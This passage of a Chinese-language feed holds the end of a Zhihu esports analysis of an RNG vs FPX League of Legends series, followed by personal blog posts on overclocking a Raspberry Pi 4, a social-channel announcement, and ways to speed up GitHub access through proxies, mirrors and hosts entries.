width=\"398\"></figure><p>这波Cryin阵亡，保住上一塔，同时RNG推掉FPX中一塔，你说谁赚？</p>\n<p>一定是FPX。</p>\n<p>第一，Cryin的人头被Nuguri吃到，大大弥补了后者的发育不良。</p>\n<p>第二，FPX推掉RNG中一的时候，中路有三个人，可以快速实施抓边。而RNG只有一个人来推FPX的中一塔，下路双人组和上单都需要去两条边路清线，拆掉中一塔以后没有办法迅速做入侵视野。</p>\n<p>这波不如放掉上一塔都好一点，RNG双人组在中的话，可以去FPX野区做很多深入的眼。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-539899f93fc59357e1bc7969799b6ce2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"394\" data-rawheight=\"390\" class=\"content_image\" width=\"394\"></figure><p>RNG曾经试着聚集起来，看看能不能做深入视野，但FPX完全没有给到他们机会。相反，瑟提还在上路自由发育带线，非常舒服。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-6f864f3c5df88a9acbb62f91d92d02a6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"396\" class=\"content_image\" width=\"398\"></figure><p>而等到FPX聚集到一起做视野的时候，他们就做了一个非常优秀的视野。看小地图，做在RNG蓝buff那边的假眼。</p>\n<p>这个假眼，给到了FPX抓死小虎的伏笔。因为Doinb就是TP这个眼，成功绕后的。</p>\n<p>我们以这张图来看RNG的视野，很明显没有几个。作为推掉三路外塔的一方，RNG视野如此没有侵略性，也是不该的。</p>\n<p>而且在分线期，RNG让发育一般的鳄鱼去下路对抗盲僧，而让发育领先的格温去上路守瑟提的线。但是在此过程中，他们既没有考虑在上半区做眼，去抓发育不良的瑟提，也没有考虑让格温去下，利用单打创造优势。算上视野，RNG的分线期基本什么都没有做。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-faede93fc47c353246b1e34ced70edec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"982\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic1.zhimg.com/v2-faede93fc47c353246b1e34ced70edec_r.jpg\"></figure><p>FPX抓到小虎，终结给到Tian，FPX中期支点终于获得巨量经济。</p>\n<p>随后，两队在小龙处打了一个旗鼓相当的团战，虽然结果是RNG取胜。但因为小虎的不断冒进，RNG丢失了打大龙的机会，让FPX最终在关键团前，拖到了盲僧的蓝盾。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d940d3d63aad58d2a4e36fa2abdace5d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1014\" data-rawheight=\"336\" class=\"origin_image zh-lightbox-thumb\" width=\"1014\" data-original=\"https://pic2.zhimg.com/v2-d940d3d63aad58d2a4e36fa2abdace5d_r.jpg\"></figure><p>为什么这个蓝盾关键？</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-d3df64e77be2070b43ec10b684b8ee22_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1612\" data-rawheight=\"1218\" class=\"origin_image zh-lightbox-thumb\" width=\"1612\" data-original=\"https://pic3.zhimg.com/v2-d3df64e77be2070b43ec10b684b8ee22_r.jpg\"></figure><p>上一秒，盲僧被插的像个刺猬。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b55729a81347be0d06776967f5b5fa61_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1454\" data-rawheight=\"1222\" class=\"origin_image zh-lightbox-thumb\" width=\"1454\" data-original=\"https://pic2.zhimg.com/v2-b55729a81347be0d06776967f5b5fa61_r.jpg\"></figure><p>下一秒，滑板鞋拔矛，触发了盲僧的血手，盲僧同时使用渴血战斧。你会感觉，算上这个护盾的话，盲僧血量和刚刚一模一样。</p>\n<p>这就是蓝盾的意义，这波Doinb单人切死RNG下路双人组，吃满了GALA的伤害后安然无事。</p>\n<p>我们总结一下，FPX中期是怎么拖住的？</p>\n<p>第一，Doinb疯狂偷资源。</p>\n<p>第二，RNG关键转线策略不当+分线期没有做事。在转线期，他们只派了状态一般的格温去守中，被FPX找到机会，利用人数优势破掉中一、做了后续入侵视野，成功抓单鳄鱼和格温。而RNG虽然也破掉FPX中一，但是没有后续的视野跟进，而且分线期没有积极做事，所以并没能从破掉中一的活动中收获成果。</p>\n<p>第三，小虎冒进，导致最能拿大龙的一波没去拿，让盲僧发育到三件套。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>3、关键团战</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d57050766a5cbd5b822f8c3bce1a9333_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1238\" data-rawheight=\"880\" class=\"origin_image zh-lightbox-thumb\" width=\"1238\" data-original=\"https://pic4.zhimg.com/v2-d57050766a5cbd5b822f8c3bce1a9333_r.jpg\"></figure><p>这波没啥多说的，FPX开的太差了，兰博大招全空，没有人管在最后方的小虎。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>三、总结</h3>\n<p>这局赢的是RNG，但是我个人看法，中期两队在运营策略上，FPX赢得更多。</p>\n<p>在第一局结束以后我的看法就是，如果FPX能忍住不做最后一波那种粗糙的开团也就是不给机会的话，那么RNG将很难拿下后两局。</p>\n<hr>\n<h2>第二局</h2>\n<h3>一、BP分析</h3>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d61ad48342fecf20c3a22bb0ba202bb1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2722\" data-rawheight=\"1524\" class=\"origin_image zh-lightbox-thumb\" width=\"2722\" data-original=\"https://pic2.zhimg.com/v2-d61ad48342fecf20c3a22bb0ba202bb1_r.jpg\"></figure><p>相较于第一局，FPX做了一个调整，那就是舍弃兰博+瑟提，更换为皎月+杰斯。</p>\n<p>这一点很重要，我们在第一局提到，皎月更加适配一些主动开团的体系。FPX认为上一局的问题是不够主动，而且瑟提打格温的counter也宣告失败，所以转头更换了新的上野组合。</p>\n<p>在这个转主动的思路下，FPX第二轮做出自ban维鲁斯的行为就很容易理解了。</p>\n<p>维鲁斯最适合塔姆，但是这样就欠缺主动性，FPX希望下路更加主动。</p>\n<p>那么卡莎+开团英雄几乎是唯一选择。</p>\n<p>这里是我认为RNG全三场BP唯一可以商讨的点，两队第二轮ban的顺序是：维鲁斯-泰坦-露露-塔姆，事实上FPX希望转主动性的打法，从拿皎月+ban维鲁斯中就可以看得出来。那么此时ban塔姆的收效并不大，不如改ban卡莎，因为卡莎是最好配合开团辅助的AD。</p>\n<p>第二轮，FPX果然出卡莎，此时RNG已经明白对面想打强开，故拿出自保能力最强的霞作为应对。日女在面对强开体系时，有一定的自保和先手能力，但是都比较弱，论强开不如泰坦稳定，论反手不如布隆全面。</p>\n<p>从总的阵容体系来说，FPX更为极端，全队贯彻冲阵体系，更为符合这个版本的思路。而RNG如果能在第二轮选小炮可能会更好一点，选霞的话，就是全面寄希望于上中的冲阵，整体阵容的协同上要求比FPX更高。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9124ba9609203c09c8e0d7f4a2dca9d1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2718\" data-rawheight=\"1514\" class=\"origin_image zh-lightbox-thumb\" width=\"2718\" data-original=\"https://pic2.zhimg.com/v2-9124ba9609203c09c8e0d7f4a2dca9d1_r.jpg\"></figure><p>从对线来看，上路杰斯小优，中路鳄鱼小优，下路卡莎+芮尔更容易拿线权。</p>\n<p>FPX的阵容重点是双边路，盲僧皎月需要利用双控制的稳定性，多去边路越塔，两个人想杀鳄鱼会需要一定装备，但是配合杰斯/芮尔去越塔则是非常容易。所以FPX需要趁中路兵线被鳄鱼推进去回推的时候，线野联动来给予边路压力，快速滚雪球拿下比赛。</p>\n<p>RNG的阵容重点是中野，鳄鱼兰博需要利用中路线权，尽可能在中野2v2上做到事情，然后辐射下路。格温缺乏控制所以比较难帮，最好帮的是有日女的下路，RNG如果能在下路打开突破口限制卡莎发育，那中期胜算将会很大。</p>\n<p>这把我是真没想到，Doinb成为Carry到最后的那个人。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>二、具体赛况</h3>\n<p>1、个人和团队，Cryin的鳄鱼困境</p>\n<p>两波随意的R你们都看得到，不说了。我们说一下团队对于鳄鱼战术的理解问题，以及Cryin在兵线调度上的问题。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-3a544bf32a35e20a938d884adc5fce81_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1546\" data-rawheight=\"1038\" class=\"origin_image zh-lightbox-thumb\" width=\"1546\" data-original=\"https://pic2.zhimg.com/v2-3a544bf32a35e20a938d884adc5fce81_r.jpg\"></figure><p>从这里开始，八分半，FPX中野击杀了一次鳄鱼。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a378ad62aa8ad4422e60cace4d680e74_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"398\" class=\"content_image\" width=\"402\"></figure><p>随后，盲僧把兵线推进塔回家，Cryin复活上线。</p>\n<p>正常来说，这波鳄鱼可以把兵线彻底推进去，盲僧大概到那个时候才刚刚上线，Cryin会领先一波支援时间差。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-72d9374f08e196d5641302764d0849a5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"396\" data-rawheight=\"398\" class=\"content_image\" width=\"396\"></figure><p>但是他没有，他把兵线推出去之后，反而是跑到野区拆了个假眼，把兵线放置在中路。</p>\n<p>这个时间点，Wei已经走到下路，RNG是打算对下路发起进攻的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4e4ddb7457a7a84f79e07616e94fde48_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"390\" data-rawheight=\"390\" class=\"content_image\" width=\"390\"></figure><p>等到Cryin再度回到线上把兵线推进去的时候，两个打野在下半区已经照面了。</p>\n<p>如果Cryin这波直接推线支援，那么等到兵线来的时候盲僧必须要在塔下守线，而鳄鱼可以跟兰博一起到场突袭下路，拿到人头会非常简单。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f3e83b938a921b40ece859840bb4c60e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1114\" data-rawheight=\"1016\" class=\"origin_image zh-lightbox-thumb\" width=\"1114\" data-original=\"https://pic3.zhimg.com/v2-f3e83b938a921b40ece859840bb4c60e_r.jpg\"></figure><p>最终的结果是，RNG没能获得击杀，只是利用先锋推掉下一塔，收益很少。</p>\n<p>这波是Cryin整个第二局的缩影，他对鳄鱼的线野联动理解我认为是有问题的。在明可以和兰博一起支援的兵线情况下，他的处理总是慢一步，进而没有办法和兰博产生联动。</p>\n<p>更麻烦的是，随后RNG开始放弃鳄鱼。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-69e8587d79c52d0b58ac91d1ac5ddb0a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"402\" class=\"content_image\" width=\"402\"></figure><p>在下一塔被推掉以后，鳄鱼被放到了下路，双人组占中，打野往上靠。而FPX的分线是让杰斯继续维持对线，盲僧去下。</p>\n<p>那这种情况下，杰斯会被抓死，但是鳄鱼也没有资格去吃线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-c42e33dd2315ce3c3b4f4508e518b40c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2482\" data-rawheight=\"1134\" class=\"origin_image zh-lightbox-thumb\" width=\"2482\" data-original=\"https://pic1.zhimg.com/v2-c42e33dd2315ce3c3b4f4508e518b40c_r.jpg\"></figure><p>双方打野对靠，FPX倒霉的是上路杰斯，RNG倒霉的则是下路的鳄鱼。</p>\n<p>问题是，鳄鱼不能被这么牺牲，而且RNG在下半区没有绕后眼可以实施绕后，但是FPX却在上路有绕后眼。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2ec28e9abd9690227047878466379c21_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1858\" data-rawheight=\"414\" class=\"origin_image zh-lightbox-thumb\" width=\"1858\" data-original=\"https://pic2.zhimg.com/v2-2ec28e9abd9690227047878466379c21_r.jpg\"></figure><p>可是你要说鳄鱼彻底被牺牲了吗？倒也没有，注意，这段时间Ming一直在靠下，他出门直接来下半区，利用扫描排了一圈视野，做了一个河道眼。在小龙还有3分40秒刷新的时候，这么做就是保护鳄鱼不被越塔。</p>\n<p>我们对比一下双方半区力量，在对推的局面里，FPX在下路投入了中野辅三人，中野推塔辅助反蹲。而RNG只在上路投入了上野两个人，辅助在下做视野。</p>\n<p>这样会有一种可能，那就是RNG上路推进节奏因为人数缺失，容易被打断。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-d163639ae99b87216058fefb0facfdd6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"406\" data-rawheight=\"390\" class=\"content_image\" width=\"406\"></figure><p>果然被打断。</p>\n<p>盲僧拆掉塔，直接TP去上抓死兰博。这波抓死直接导致RNG这波进攻轮次停止，他们没办法在这波之内推完上一塔，必须要下波再来。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-fcc86aabc7ab1f34d742bd649ea6995d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1594\" data-rawheight=\"1012\" class=\"origin_image zh-lightbox-thumb\" width=\"1594\" data-original=\"https://pic2.zhimg.com/v2-fcc86aabc7ab1f34d742bd649ea6995d_r.jpg\"></figure><p>下路皎月负责把兵线推进去，然后断掉了鳄鱼的TP支援，随后往野区逃命去了，这波成功勾引出了GALA的闪现，13分42秒，GALA交闪拿人头没拿到。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-14eb3d092fb0027d5dc4716daf017d06_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"410\" data-rawheight=\"408\" class=\"content_image\" width=\"410\"></figure><p>随后继续分线期运营，RNG还是把格温放在上路吃线，但是此时他们把鳄鱼调来野区一起吃资源，因为下半区已经彻底归FPX控制，鳄鱼不能去下半区发育。但是这样一来，鳄鱼的发育就会进一步停滞。那么问题来了，为什么RNG在自身小龙压力极大的情况下，还要坚持打上半区？</p>\n<p>因为上一塔没推掉，他们执着的想去推上一塔。</p>\n<p>而上一塔没推掉的原因，就是RNG想放弃鳄鱼但又不想放弃鳄鱼的矛盾态度。如Ming直接去上参与推塔或反蹲，那么盲僧的TP就是葬送自己的优势，RNG很大概率能拿下上一塔。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d6fb81e60540ad167b5a965eb5a1ccd9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"382\" data-rawheight=\"390\" class=\"content_image\" width=\"382\"></figure><p>等到RNG终于推掉上一塔的时候，小龙已经快要刷新了。</p>\n<p>你说推上一塔是否重要？当然，RNG推掉了自然会有收益。但是在小龙情况非常不利之时，这么执着于上一塔真的好吗？</p>\n<p>因为FPX有两条小龙，所以在第三条小龙RNG必须来争，不能轻易地放龙魂点团。但是因为RNG主打上半区，那么一个下半区没有视野、没有兵线优势、AD没有闪现的RNG，要怎么去争这波团呢？</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bf8cf78d08a81e6e64480f32bf2fc483_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1970\" data-rawheight=\"1068\" class=\"origin_image zh-lightbox-thumb\" width=\"1970\" data-original=\"https://pic4.zhimg.com/v2-bf8cf78d08a81e6e64480f32bf2fc483_r.jpg\"></figure><p>答案就是争不了。这波打完以后，因为鳄鱼长期没有线吃而盲僧有，两人的差距已经拉到天堑之别，没法追回来了。</p>\n<p>我们总结一下，RNG为什么玩不好鳄鱼战术？</p>\n<p>第一，Cryin把鳄鱼当做加里奥在玩，所以会有第一波的亏线支援。但是他玩的又不够加里奥，所以才会有不快速推线支援的兵线处理动作，这种处于两种打法之间的思路，是两头都得不到的。</p>\n<p>第二，RNG对鳄鱼的态度不明确。他们把鳄鱼放在下路，是想牺牲鳄鱼发育的；他们让Ming出门去下半区排视野做眼，又是想保护鳄鱼的。这种两端纠结的态度让他们在转线期处处落于被动：FPX下路进逼，鳄鱼只能放弃发育；FPX上路抓人，RNG只能被抓。</p>\n<p>这就是标题所谓的个人和团队的困境，无论是选手还是战队，他们对于鳄鱼战术的理解都不稳定，既可以当工具人又需要C，既可以牺牲又需要保护。再加上我没提到的一些选手熟练度问题，比如提前开R等等，导致最后鳄鱼表现和发育极度落后</p>\n<hr>\n<h2>第三局</h2>\n<p>这把我们只说BP，人机般的对局没什么复盘意义。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-40169446a40e37be69b0bd2d8ea24735_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2714\" data-rawheight=\"1510\" class=\"origin_image zh-lightbox-thumb\" width=\"2714\" data-original=\"https://pic2.zhimg.com/v2-40169446a40e37be69b0bd2d8ea24735_r.jpg\"></figure><p>这把BP让RNG的英雄池短板暴露无遗。</p>\n<p>因为自己不能玩鳄鱼，所以鳄鱼给到对面，自己拿盲僧——但是盲僧被鳄鱼counter，而且FPX鳄鱼两路摇摆</p>\n<p>因为中路符合版本的前中期中单只有梦魇，但是梦魇打不过鳄鱼，所以只能出卡尔玛——佛耶戈、瑟提、格温全在外面</p>\n<p>卡尔玛加奥拉夫必须要等卡尔玛一个大件以后才有主动性，而且强度完全不如卡尔玛赵信，没有赵信的强开团能力——这个组合只能算是一个替代品，前三手出替代品是不是浪费？</p>\n<p>因为中野的强开能力不强，所以辅助必须要补牛头——小炮牛头下路拿什么抢线权？</p>\n<p>上路没法出鳄鱼，中路更多英雄没法出，导致整体BP全部受限。</p>\n<p>在MSI上，RNG就因为英雄池问题一度非常难做BP，好在后来Cryin练出了梦魇和中单卢锡安，但是在夏季赛的版本，中路前期对抗性进一步提升，梦魇很多时候都无法拿出来。在卢锡安持续被ban的情况下，Cryin能拿出什么英雄？</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-32296fd931ea48ed3ec87dcf5c5171ca_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1032\" data-rawheight=\"738\" class=\"origin_image zh-lightbox-thumb\" width=\"1032\" data-original=\"https://pic3.zhimg.com/v2-32296fd931ea48ed3ec87dcf5c5171ca_r.jpg\"></figure><p>这里是夏季赛到现在为止，BP率超过25%的中路英雄列表。</p>\n<p>现在RNG很多时候需要依靠小虎，因为只有他跟上了版本练出了格温，成为队伍中期可能的支柱。但是一旦格温被ban，但靠盲僧在11.12或11.13是没法做到什么的，我在之前的一条动态里也给大家分享过外赛区的一个数据：上单盲僧胜率不断降低，因为好打盲僧的英雄越来越多。在这种大趋势下，上路又能拿出当前版本多少强势英雄？</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-0942a1ca67b30996cc788517ac342cb9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1044\" data-rawheight=\"674\" class=\"origin_image zh-lightbox-thumb\" width=\"1044\" data-original=\"https://pic2.zhimg.com/v2-0942a1ca67b30996cc788517ac342cb9_r.jpg\"></figure><p>这是夏季赛到目前为止，BP率超过25%的上路英雄列表，鳄鱼、瑟提没法拿出来，成为小虎最致命的BP点。</p>\n<p>我不是很想说这些，因为MSI之前这些都说的差不多了。我以为在MSI上RNG解决了这个问题，但是伴随着版本的变化和格温、佛耶戈的解锁，上中英雄池发生巨变，如今摆在RNG面前的问题更加严峻。</p>\n<p>而且多提一句，Cryin的亏线支援思路，我不知道是谁定的，但是太有问题了：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2cab28661150dac291e52d604f1bf9d1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"396\" data-rawheight=\"398\" class=\"content_image\" width=\"396\"></figure><p>这波卡尔玛去支援上路，被Doinb蹲到单杀，成为中路对线转折点。</p>\n<p>看兵线，Doinb是推一波兵线进塔，然后去支援的，Cryi是直接去上半区支援。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-82cf3abff5a0ce0114e666eaeae8db4d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1196\" data-rawheight=\"1052\" class=\"origin_image zh-lightbox-thumb\" width=\"1196\" data-original=\"https://pic2.zhimg.com/v2-82cf3abff5a0ce0114e666eaeae8db4d_r.jpg\"></figure><p>亏线的结果就是5级打6级。</p>\n<p>虽然说6级对卡尔玛提升不是质变，但是多一级的大招，无论是Q的伤害还是E的护盾时间都会有提升。无论如何，没有这么支援的道理。</p>\n<hr>\n<h2>总结</h2>\n<p>RNG现在要考虑考虑怎么进季后赛了。隔离期间已经结束一段时间了，再练不出新东西就只能是人的问题了。而且相对于操作问题，比如GALA跳脸或者Cryin的迷之大招，我更关心的是RNG在中期运营层面的落后，这是我在以往的RNG身上所未曾发现的，希望失败不要影响他们的心态。</p>\n<p>这里为了防止理解错误，必须要说一句。RNG在中期运营的落后，不是指他们不做事，而是指他们做了事却没什么收益。比如第一局，RNG一波运营拿下先锋+小龙+下一塔，但因为防守不当导致中路丢失，进而导致鳄鱼被抓，还被FPX做了深入视野。反过来自己推掉FPX中塔的时候，因为人手不足所以没法做眼，这就是典型的“做了事但是没收益”，类似的还有第二局对鳄鱼的态度不明确，没有让Ming去上路帮忙拆塔，但是又非常执着于上一塔。</p>\n<p>FPX这一局展现出来的中期运营能力和抓机会能力很强，如果他们能保持这个状态，我觉得他们后续比赛的表现一定会一路上扬，前提是保持的住。</p>\n<p>但是Nuguri被疯狂单杀是不该的，如果不是他的ID是Nuguri，这换任何一个队伍可能下场直接换二队上来了。如果不是整个队伍中期运营实在强，他这种打法和状态在这个打前中期的版本基本不可能取得胜利，希望他尽快调整。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/YInTIanCLANG?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">尹天</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/384312961?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"树莓派超频","date":"2021-06-25 15:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"订阅 YFun's Blog","date":"2021-06-20 10:30:00","description":"\n<p>自 2021 年 6 月 20 日起，本博客将同步更新 Twitter 和 Telegram 频道(由 IFTTT 提供支持)。</p>\n<ul>\n<li><a href=\"https://t.me/s/always_explore\">Telegram Channel</a></li>\n<li><a href=\"https://twitter.com/OhhhCKY\">Twitter</a></li>\n</ul>\n","link":"https://blog.yfun.top/posts/3249015232/"},{"title":"加速 GitHub 下载","date":"2021-06-18 17:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img 